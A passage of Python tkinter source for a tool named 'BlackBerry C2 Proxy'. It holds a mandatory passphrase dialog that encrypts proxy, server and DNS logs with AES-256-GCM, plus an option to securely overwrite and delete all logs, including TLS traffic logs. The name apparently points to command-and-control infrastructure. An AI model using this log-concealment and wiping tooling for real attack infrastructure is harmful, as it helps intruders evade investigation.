    Diálogo de acceso — PASSPHRASE SIEMPRE OBLIGATORIA.
    Cifra logs de Proxy + Server + DNS con la misma clave AES-256-GCM.

    A) Primer arranque (sin salt): solicita crear passphrase (no hay opción de saltarse).
    B) Salt existe: verifica passphrase antes de abrir la GUI.
    C) Opción de borrado irrecuperable si se olvidó la passphrase.

    Devuelve True si autenticado, False si el usuario cerró/canceló.
    """
    global _PROXY_LOG_KEY, _SERVER_LOG_KEY, _DNS_LOG_KEY

    log_encrypted = os.path.isfile(_PROXY_SALT_PATH)

    result = {'go': False}

    # ── Aplicar tema oscuro al root antes del diálogo ─────────────────────────
    BG      = _TH["bg"]
    SURF    = _TH["surface"]
    BORDER  = _TH["border"]
    TEXT    = _TH["text"]
    DIM     = _TH["text_dim"]
    ACCENT  = _TH["accent"]
    RED     = _TH["red"]
    GREEN   = _TH["green"]
    ENTRY   = _TH["entry_bg"]

    root.option_add("*background",       BG)
    root.option_add("*foreground",       TEXT)
    root.option_add("*Entry.background", ENTRY)
    root.option_add("*Entry.foreground", TEXT)
    root.option_add("*Entry.insertBackground", ACCENT)
    root.option_add("*highlightThickness", "0")

    dlg = tk.Toplevel(root)
    dlg.title("BlackBerry C2")
    dlg.resizable(False, False)
    dlg.grab_set()
    dlg.configure(bg=BG)

    W, H = 480, 360 if log_encrypted else 310
    sw   = dlg.winfo_screenwidth()
    sh   = dlg.winfo_screenheight()
    dlg.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")

    # ── Header con barra de acento ────────────────────────────────────────────
    top_bar = tk.Frame(dlg, bg=ACCENT, height=3)
    top_bar.pack(fill='x')

    hdr = tk.Frame(dlg, bg=SURF)
    hdr.pack(fill='x')

    # Icono + título
    hdr_inner = tk.Frame(hdr, bg=SURF)
    hdr_inner.pack(fill='x', padx=24, pady=(18, 14))

    tk.Label(hdr_inner, text="🔐", bg=SURF, font=('Segoe UI Emoji', 22)).pack(side='left')
    title_box = tk.Frame(hdr_inner, bg=SURF)
    title_box.pack(side='left', padx=(12, 0))
    tk.Label(title_box, text="BlackBerry C2 Proxy",
             bg=SURF, fg=TEXT, font=('Segoe UI', 13, 'bold')).pack(anchor='w')
    tk.Label(title_box,
             text="Logs cifrados: Proxy · Servidor · DNS  |  AES-256-GCM + PBKDF2",
             bg=SURF, fg=DIM, font=('Segoe UI', 8)).pack(anchor='w')

    # Separador
    tk.Frame(dlg, bg=BORDER, height=1).pack(fill='x')

    # ── Cuerpo ────────────────────────────────────────────────────────────────
    body = tk.Frame(dlg, bg=BG)
    body.pack(fill='both', expand=True, padx=24, pady=18)

    if log_encrypted:
        status_msg  = "Los logs están cifrados con AES-256-GCM."
        status_sub  = "Introduce la passphrase para continuar."
        status_col  = DIM
    else:
        status_msg  = "Primera vez: crea tu passphrase de acceso."
        status_sub  = "Cifrará los logs de Proxy, Servidor y DNS. No se puede omitir."
        status_col  = DIM

    tk.Label(body, text=status_msg, bg=BG, fg=TEXT,
             font=('Segoe UI', 10, 'bold')).pack(anchor='w')
    tk.Label(body, text=status_sub, bg=BG, fg=status_col,
             font=('Segoe UI', 9)).pack(anchor='w', pady=(2, 16))

    # Campo passphrase con borde de acento al foco
    pp_frame = tk.Frame(body, bg=BORDER, padx=1, pady=1)
    pp_frame.pack(fill='x')
    pp_inner = tk.Frame(pp_frame, bg=ENTRY)
    pp_inner.pack(fill='x')

    pp_lbl = tk.Label(pp_inner, text="  PASSPHRASE", bg=ENTRY, fg=DIM,
                       font=('Consolas', 7, 'bold'))
    pp_lbl.pack(anchor='w', padx=6, pady=(6, 0))

    pp_var   = tk.StringVar()
    pp_entry = tk.Entry(pp_inner, textvariable=pp_var, show='●',
                        bg=ENTRY, fg=TEXT, insertbackground=ACCENT,
                        font=('Consolas', 12), relief='flat',
                        highlightthickness=0, bd=0)
    pp_entry.pack(fill='x', padx=8, pady=(2, 8))
    pp_entry.focus_set()

    def _on_focus_in(_):
        pp_frame.configure(bg=ACCENT)
    def _on_focus_out(_):
        pp_frame.configure(bg=BORDER)
    pp_entry.bind("<FocusIn>",  _on_focus_in)
    pp_entry.bind("<FocusOut>", _on_focus_out)

    # Status error
    status_var = tk.StringVar()
    status_lbl = tk.Label(body, textvariable=status_var, bg=BG, fg=RED,
                          font=('Segoe UI', 8))
    status_lbl.pack(anchor='w', pady=(6, 0))

    # ── Botón principal ───────────────────────────────────────────────────────
    def _make_btn(parent, text, cmd, bg, fg, hover_bg):
        btn = tk.Label(parent, text=text, bg=bg, fg=fg,
                       font=('Segoe UI', 9, 'bold'), cursor="hand2",
                       padx=16, pady=7, relief='flat')
        btn.bind("<Button-1>", lambda _: cmd())
        btn.bind("<Enter>",    lambda _: btn.configure(bg=hover_bg))
        btn.bind("<Leave>",    lambda _: btn.configure(bg=bg))
        return btn

    btn_row = tk.Frame(body, bg=BG)
    btn_row.pack(fill='x', pady=(12, 0))

    def _do_apply():
        pp = pp_var.get()
        if not pp:
            status_var.set("⚠  La passphrase es obligatoria")
            pp_entry.focus_set()
            return
        if len(pp) < 8:
            status_var.set("⚠  Mínimo 8 caracteres")
            return
        if not _CRYPTO_AVAILABLE:
            status_var.set("⚠  pip install cryptography")
            return

        status_var.set("  Derivando clave…")
        dlg.update()

        try:
            if log_encrypted:
                with open(_PROXY_SALT_PATH, 'rb') as f:
                    salt = f.read()
                key, _ = _derive_key(pp, salt)
                if not _log_verify_key(key, LOG_PROXY_ENC_FILE) and os.path.isfile(LOG_PROXY_ENC_FILE):
                    status_var.set("⚠  Passphrase incorrecta — inténtalo de nuevo")
                    pp_var.set('')
                    pp_entry.focus_set()
                    return
            else:
                key, salt = _derive_key(pp)
                os.makedirs(os.path.dirname(_PROXY_SALT_PATH), exist_ok=True)
                with open(_PROXY_SALT_PATH, 'wb') as f: f.write(salt)
                try: os.chmod(_PROXY_SALT_PATH, 0o600)
                except OSError: pass

            _PROXY_LOG_KEY  = key
            _SERVER_LOG_KEY = key   # misma clave para todos
            _DNS_LOG_KEY    = key
            _activate_encrypted_logs()
            result['go'] = True
            dlg.destroy()
        except Exception as e:
            status_var.set(f"⚠  Error: {e}")

    _make_btn(btn_row, "  Desbloquear  →", _do_apply,
              ACCENT, "#0e1117", _TH["btn_act"]).pack(side='left')

    # ── Borrado irrecuperable ─────────────────────────────────────────────────
    tk.Frame(body, bg=BORDER, height=1).pack(fill='x', pady=(20, 12))

    tk.Label(body, text="¿Olvidaste la passphrase?",
             bg=BG, fg=DIM, font=('Segoe UI', 8, 'italic')).pack(anchor='w')

    def _do_delete_logs():
        # ── VERIFICACIÓN ADICIONAL: si hay salt, pedir passphrase antes de borrar ─
        # Esto previene que alguien sin la passphrase use "borrar" como bypass de entrada
        if os.path.isfile(_PROXY_SALT_PATH):
            # Crear sub-diálogo de confirmación con passphrase
            confirm_result = {"ok": False}
            cdlg = tk.Toplevel(dlg)
            cdlg.title("🔐 Confirmar borrado")
            cdlg.update_idletasks()
            cdlg.grab_set()
            
            cdlg.resizable(False, False)
            cdlg.grab_set()
            cdlg.configure(bg=BG)
            CW, CH = 420, 210
            csw = cdlg.winfo_screenwidth(); csh = cdlg.winfo_screenheight()
            cdlg.geometry(f"{CW}x{CH}+{(csw-CW)//2}+{(csh-CH)//2}")
            tk.Frame(cdlg, bg=RED, height=3).pack(fill="x")
            tk.Label(cdlg, text="  Confirma la passphrase para borrar los logs",
                     bg=SURF, fg=RED, font=("Segoe UI", 9, "bold")).pack(anchor="w", padx=14, pady=8)
            tk.Frame(cdlg, bg=BORDER, height=1).pack(fill="x")
            cbody = tk.Frame(cdlg, bg=BG); cbody.pack(fill="both", expand=True, padx=16, pady=10)
            cpf = tk.Frame(cbody, bg=BORDER, padx=1, pady=1); cpf.pack(fill="x")
            cpi = tk.Frame(cpf, bg=ENTRY); cpi.pack(fill="x")
            tk.Label(cpi, text="  PASSPHRASE", bg=ENTRY, fg=DIM,
                     font=("Consolas", 7, "bold")).pack(anchor="w", padx=5, pady=(4,0))
            cpp_var = tk.StringVar()
            cpp_e = tk.Entry(cpi, textvariable=cpp_var, show="●",
                             bg=ENTRY, fg=TEXT, insertbackground=ACCENT,
                             font=("Consolas", 11), relief="flat", bd=0)
            cpp_e.pack(fill="x", padx=6, pady=(2,6))
            cpp_e.focus_set()
            def _cfi(_): cpf.configure(bg=RED)
            def _cfo(_): cpf.configure(bg=BORDER)
            cpp_e.bind("<FocusIn>", _cfi); cpp_e.bind("<FocusOut>", _cfo)
            cerr = tk.StringVar()
            tk.Label(cbody, textvariable=cerr, bg=BG, fg=RED,
                     font=("Segoe UI", 8)).pack(anchor="w", pady=(4,0))
            def _cverify():
                pp = cpp_var.get()
                if not pp: cerr.set("⚠  Obligatoria"); return
                try:
                    with open(_PROXY_SALT_PATH, "rb") as f_s: salt = f_s.read()
                    key, _ = _derive_key(pp, salt)
                    # Verificar contra log cifrado si existe, o simplemente aceptar si solo hay salt
                    if os.path.isfile(LOG_PROXY_ENC_FILE):
                        if not _log_verify_key(key, LOG_PROXY_ENC_FILE):
                            cerr.set("⚠  Passphrase incorrecta"); cpp_var.set(""); cpp_e.focus_set(); return
                    confirm_result["ok"] = True; cdlg.destroy()
                except Exception as ex: cerr.set(f"⚠  {ex}")
            cbtns = tk.Frame(cbody, bg=BG); cbtns.pack(fill="x", pady=(6,0))
            cb_ok = tk.Label(cbtns, text="  Confirmar  ", bg=RED, fg="#ffffff",
                             font=("Segoe UI", 8, "bold"), padx=10, pady=5, cursor="hand2")
            cb_ok.bind("<Button-1>", lambda _: _cverify())
            cb_ok.pack(side="left")
            cb_no = tk.Label(cbtns, text="  Cancelar  ", bg=SURF, fg=DIM,
                             font=("Segoe UI", 8), padx=10, pady=5, cursor="hand2")
            cb_no.bind("<Button-1>", lambda _: cdlg.destroy())
            cb_no.pack(side="left", padx=6)
            cpp_e.bind("<Return>", lambda _: _cverify())
            cdlg.protocol("WM_DELETE_WINDOW", cdlg.destroy)
            dlg.wait_window(cdlg)
            if not confirm_result["ok"]:
                return   # passphrase incorrecta o cancelado → NO se borra nada

        all_logs = [
            LOG_PROXY_FILE, LOG_PROXY_ENC_FILE, _PROXY_SALT_PATH,
            LOG_SERVER_FILE, LOG_SERVER_ENC_FILE, _SERVER_SALT_PATH,
            LOG_DNS_FILE, LOG_DNS_ENC_FILE, _DNS_SALT_PATH,
            TRAFFIC_LOG_FILE,
            f'{script_dir}/logs/BlackBerry_TLSProxyTraffic.log',
        ]
        existing = [f for f in all_logs if os.path.isfile(f)]
        names = '\n'.join(f"  • {os.path.basename(f)}" for f in existing)

        if not messagebox.askyesno(
            "⚠ Borrado irrecuperable",
            f"Se eliminarán TODOS los logs (3 pasadas aleatorias + ceros):\n\n"
            f"{names}\n\n"
            "Esta acción NO se puede deshacer. ¿Confirmas?",
            icon='warning', parent=dlg
        ):
            return

        errors = []
        for f in existing:
            try: _secure_delete(f)
            except Exception as e: errors.append(f"{os.path.basename(f)}: {e}")

        if errors:
            messagebox.showwarning("Borrado parcial",
                "No se pudieron eliminar:\n" + '\n'.join(errors), parent=dlg)
        else:
            messagebox.showinfo("✓ Logs eliminados",
                f"{len(existing)} archivo(s) eliminados.\nArranca limpio con nueva passphrase.",
                parent=dlg)
        result['go'] = True
        dlg.destroy()

    _make_btn(body, "  🗑  Borrar todos los logs y arrancar limpio", _do_delete_logs,
              "#1e1010", RED, "#2d1010").pack(anchor='w', pady=(4, 0))

    # ── Cerrar = salida total — no hay bypass ────────────────────────────────
    def _on_close():
        result['go'] = False
        dlg.destroy()
        try: root.quit()
        except Exception: pass
        try: root.destroy()
        except Exception: pass

    pp_entry.bind('<Return>', lambda _: _do_apply())
    dlg.protocol("WM_DELETE_WINDOW", _on_close)
    root.wait_window(dlg)
    return result['go']


def main():
    """Función principal."""
    os.makedirs(f"{script_dir}/logs", exist_ok=True)
    os.makedirs(f"{script_dir}/cert", exist_ok=True)

    root = tk.Tk()
    root.withdraw()   # ocultar hasta pasar el gate

    # ── Estilo para botón de peligro ──────────────────────────────────────────
    style = ttk.Style()
    try:
        style.configure('Danger.TButton', foreground='white', background='#c0392b')
    except Exception:
        pass

    # ── Gate de passphrase bloqueante ─────────────────────────────────────────
    can_open = _passphrase_gate(root)
    if not can_open:
        try: root.destroy()
        except Exception: pass
        sys.exit(0)

    root.deiconify()
    _apply_dark_theme(root)   # Midnight Operator dark theme
    app = None
    try:
        app = BlackBerryProxyGUI(root)
        root.protocol("WM_DELETE_WINDOW", app.on_closing)
        root.mainloop()
    except KeyboardInterrupt:
        logger.info("Interrupción por teclado")
        if app and app.running:
            stop_proxy_server()
            if app:
                save_blacklist(app.blocked_ips)
    except Exception as e:
        logger.exception(f"Error crítico: {e}")
    finally:
        try:
            stop_proxy_server()
            time.sleep(0.5)
        except:
            pass
        logger.info("Aplicación cerrada")

if __name__ == '__main__':
    main()
